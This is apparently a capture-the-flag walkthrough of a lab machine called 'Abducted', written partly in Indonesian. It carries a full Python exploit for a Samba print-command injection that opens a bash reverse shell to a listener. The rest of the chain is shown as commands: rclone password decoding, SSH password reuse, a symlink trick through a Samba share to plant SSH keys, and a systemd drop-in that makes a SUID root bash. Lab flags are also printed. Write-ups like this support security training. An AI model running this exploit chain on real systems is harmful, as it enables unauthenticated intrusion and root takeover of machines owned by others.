# Abducted

**Difficulty:** Medium  
**OS:** Linux  
**Category:** Samba, CVE-2026-4480, Privilege Escalation, Systemd, Polkit

---

## Reconnaissance

### Nmap Scan

```bash
nmap -sSVC --open -Pn 10.129.244.177
```

```
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 9.6p1 Ubuntu 3ubuntu13.9 (Ubuntu Linux; protocol 2.0)
139/tcp open  netbios-ssn Samba smbd 4
445/tcp open  netbios-ssn Samba smbd 4
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Only SSH and Samba are exposed.

### SMB Enumeration

```bash
smbclient -L //10.129.244.177 -N
```

```
Sharename       Type      Comment
---------       ----      -------
HP-Reception    Printer   Reception printer
projects        Disk      Hartley Group Project Files
transfer        Disk      Staff file transfer
IPC$            IPC       IPC Service (Hartley Group Document Services)
```

- `HP-Reception` — printer share, **guest accessible**
- `projects` — disk share, no anonymous access
- `transfer` — disk share, no anonymous access

### User Enumeration

```bash
rpcclient -U "" -N 10.129.244.177 -c "enumdomusers"
```

```
user:[scott] rid:[0x3e8]
```

One user found: **scott**. No password known yet.

---

## Foothold — CVE-2026-4480 (Samba Print Command Injection)

### Vulnerability Analysis

**CVE-2026-4480** — Unauthenticated RCE via Samba print subsystem command injection.
- **CVSS:** 10.0
- **Fixed in:** Samba 4.22.10, 4.23.8, 4.24.3
- **Affected:** print backends running `print command` that references `%J` (`printing = sysv`)

When a print job finishes spooling, Samba runs the configured `print command` through `system()`, substituting `%J` with the client-supplied job name **without sanitization** (except `'` → `_`). Shell metacharacters like `|`, `;`, `&` all reach the shell unchanged.

The `HP-Reception` printer share allows guest printing — making this exploitable **without authentication**.

### Exploit Script

```python
#!/usr/bin/env python3
"""
CVE-2026-4480 - Samba print-command (%J) injection -> unauthenticated RCE.
"""
import argparse
import sys

try:
    from samba.dcerpc import spoolss
    from samba.param import LoadParm
    from samba.credentials import Credentials
except ImportError:
    sys.exit("[-] Samba Python bindings missing. Install with: sudo apt install python3-samba")

PRINTER_ACCESS_USE = 0x00000008


def reverse_shell(lhost, lport):
    return ("setsid bash -c 'bash -i >& /dev/tcp/%s/%d 0>&1' >/dev/null 2>&1 &\n"
            % (lhost, lport)).encode()


def exploit(rhost, printer, body):
    lp = LoadParm()
    lp.load_default()
    creds = Credentials()
    creds.guess(lp)
    creds.set_anonymous()

    binding = r"ncacn_np:%s[\pipe\spoolss]" % rhost
    iface = spoolss.spoolss(binding, lp, creds)

    handle = iface.OpenPrinter("\\\\%s\\%s" % (rhost, printer), "",
                                spoolss.DevmodeContainer(), PRINTER_ACCESS_USE)

    info = spoolss.DocumentInfo1()
    info.document_name = "|sh"      # this lands in %J
    info.output_file = None
    info.datatype = "RAW"
    ctr = spoolss.DocumentInfoCtr()
    ctr.level = 1
    ctr.info = info

    iface.StartDocPrinter(handle, ctr)
    iface.StartPagePrinter(handle)
    iface.WritePrinter(handle, body, len(body))  # this is %s (run as script)
    iface.EndPagePrinter(handle)
    iface.EndDocPrinter(handle)   # triggers the print command
    iface.ClosePrinter(handle)


def main():
    p = argparse.ArgumentParser(description="CVE-2026-4480 Samba print %J injection -> reverse shell")
    p.add_argument("rhost", help="target Samba host/IP")
    p.add_argument("lhost", help="your listener IP (e.g. tun0)")
    p.add_argument("lport", type=int, help="your listener port")
    p.add_argument("-P", "--printer", default="HP-Reception",
                   help="guest printer share name (default: HP-Reception)")
    p.add_argument("-c", "--cmd",
                   help="run this shell command instead of a reverse shell (LHOST/LPORT ignored)")
    args = p.parse_args()

    if args.cmd:
        body = (args.cmd.rstrip("\n") + "\n").encode()
    else:
        body = reverse_shell(args.lhost, args.lport)

    print("[*] target   : %s (\\\\%s\\%s)" % (args.rhost, args.rhost, args.printer))
    if not args.cmd:
        print("[*] callback : %s:%d  (start a listener first: nc -lvnp %d)"
              % (args.lhost, args.lport, args.lport))
    try:
        exploit(args.rhost, args.printer, body)
    except Exception as e:
        sys.exit("[-] exploit failed: %s" % e)
    print("[+] print job submitted -- check your listener / out-of-band channel")


if __name__ == "__main__":
    main()
```

### Execution

```bash
# Terminal 1: Start listener
nc -lvnp 4444

# Terminal 2: Fire exploit
python3 exploit.py 10.129.244.177 10.10.15.253 4444
```

```
listening on [any] 4444 ...
connect to [10.10.15.253] from (UNKNOWN) [10.129.244.177] 44446
bash: cannot set terminal process group (2068): Inappropriate ioctl for device
bash: no job control in this shell
nobody@abducted:/var/spool/samba$ id
uid=65534(nobody) gid=65534(nogroup) groups=65534(nogroup)
```

**Shell diperoleh sebagai `nobody`!**

---

## User Escalation — Nobody → Scott

### Enumeration

Menemukan konfigurasi backup offsite:

```bash
nobody@abducted:/$ cat /opt/offsite-backup/rclone.conf
```

```
[offsite]
type = sftp
host = backup.hartley-group.internal
user = svc-backup
pass = HZKAxfnMj-nLm59X9gpcC2ohjQL-WqVT6yRsNw
shell_type = unix
```

### Decode rclone Password

rclone menggunakan obfuscasi reversibel (bukan enkripsi):

```bash
nobody@abducted:/$ rclone reveal HZKAxfnMj-nLm59X9gpcC2ohjQL-WqVT6yRsNw
iXzvcib3SrpZ
```

### Password Reuse

Password `iXzvcib3SrpZ` ternyata **di-reuse** untuk user `scott`:

```bash
ssh scott@10.129.244.177
scott@abducted:~$ id
uid=1000(scott) gid=1001(scott) groups=1001(scott)
scott@abducted:~$ cat user.txt
bf46ba0f14356da45cf497492c173fd1
```

**User flag: `bf46ba0f14356da45cf497492c173fd1`** ✅

---

## Lateral Movement — Scott → Marcus

### Samba Configuration Analysis

```bash
scott@abducted:~$ cat /etc/samba/shares.conf
```

```
[transfer]
comment = Staff file transfer
path = /srv/transfer
valid users = scott
force user = marcus
read only = no
wide links = yes
browseable = yes
```

**Key findings:**
- `force user = marcus` — semua operasi file di share berjalan sebagai **marcus**
- `wide links = yes` — Samba mengikuti symlink keluar dari direktori share
- `scott` memiliki akses ke share dan memiliki direktori `/srv/transfer`

```bash
scott@abducted:~$ grep -E 'unix extensions|wide links' /etc/samba/smb.conf
unix extensions = no
allow insecure wide links = yes
```

### Symlink Attack

```bash
# Generate SSH key pair
ssh-keygen -q -t ed25519 -N '' -f /tmp/k

# Create symlink ke home marcus
ln -sf /home/marcus /srv/transfer/mh

# Upload authorized_keys via smbclient
smbclient //127.0.0.1/transfer -U 'scott%iXzvcib3SrpZ' \
  -c 'mkdir mh/.ssh; put /tmp/k.pub mh/.ssh/authorized_keys'
```

### SSH sebagai Marcus

```bash
ssh -i /tmp/k marcus@10.129.244.177
marcus@abducted:~$ id
uid=1001(marcus) gid=1002(marcus) groups=1002(marcus),1000(operators)
```

**Marcus** adalah anggota grup **`operators`**.

---

## Privilege Escalation — Marcus → Root

### Enumeration — Grup `operators`

```bash
marcus@abducted:~$ ls -ld /etc/systemd/system/smbd.service.d
drwxrws--- 2 root operators 4096 ... /etc/systemd/system/smbd.service.d
```

Direktori `smbd.service.d` dimiliki oleh `root:operators` dengan setgid bit — **grup `operators` bisa menulis file di dalamnya**. Ini adalah **systemd drop-in directory** — file `.conf` di sini akan digabung ke `smbd.service`.

### Polkit Enumeration

```bash
marcus@abducted:~$ pkaction | while read action; do
  pkcheck --action-id "$action" --process $$ 2>/dev/null && echo "ALLOWED: $action"
done
```

```
ALLOWED: org.freedesktop.systemd1.reload-daemon
```

Grup `operators` diizinkan untuk **reload systemd daemon** tanpa password.

### Systemd Drop-in Exploit

Kombinasi dua temuan:
1. **Drop-in writable** → dapat membuat `smbd.service` menjalankan perintah sebagai root
2. **Polkit delegasi** → dapat reload & restart `smbd.service` tanpa password

```bash
# Buat drop-in untuk copy bash + set SUID
cat > /etc/systemd/system/smbd.service.d/override.conf << 'EOF'
[Service]
ExecStartPre=/bin/cp /bin/bash /tmp/.rb
ExecStartPre=/bin/chmod 4755 /tmp/.rb
EOF

# Reload daemon dan restart smbd (polkit mengizinkan tanpa password)
systemctl daemon-reload
systemctl restart smbd

# Verifikasi SUID binary
ls -la /tmp/.rb
-rwsr-xr-x 1 root root 1446024 ... /tmp/.rb
```

### Root Shell

```bash
marcus@abducted:~$ /tmp/.rb -p -c 'id; cat /root/root.txt'
uid=1001(marcus) gid=1002(marcus) euid=0(root) groups=1002(marcus),1000(operators)
7b3169c1add79dfee37b9d7fae1f4e98
```

**Root flag: `7b3169c1add79dfee37b9d7fae1f4e98`** ✅

---

## Attack Chain Summary

```
CVE-2026-4480 (Samba Print Injection)
  → Reverse shell sebagai nobody
    → rclone.conf → password decode
      → SSH sebagai scott
        → SMB symlink attack (force user + wide links)
          → SSH sebagai marcus
            → Systemd drop-in (writable by operators)
              → Polkit reload delegation
                → SUID bash → ROOT
```

## Key Vulnerabilities

| Step | Vulnerability | CVE / Technique |
|------|---------------|-----------------|
| 1 | Samba print command injection | CVE-2026-4480 (CVSS 10.0) |
| 2 | rclone password obfuscation (reversible) | CWE-257 |
| 3 | Password reuse | CWE-798 |
| 4 | SMB wide links + force user misconfig | CWE-285 |
| 5 | Systemd drop-in misconfiguration | CWE-276 |
| 6 | Polkit over-permissive delegation | CWE-862 |

## Flags

- **User flag:** `bf46ba0f14356da45cf497492c173fd1`
- **Root flag:** `7b3169c1add79dfee37b9d7fae1f4e98`

---

**Walkthrough by Mr Team — Cyber Security**
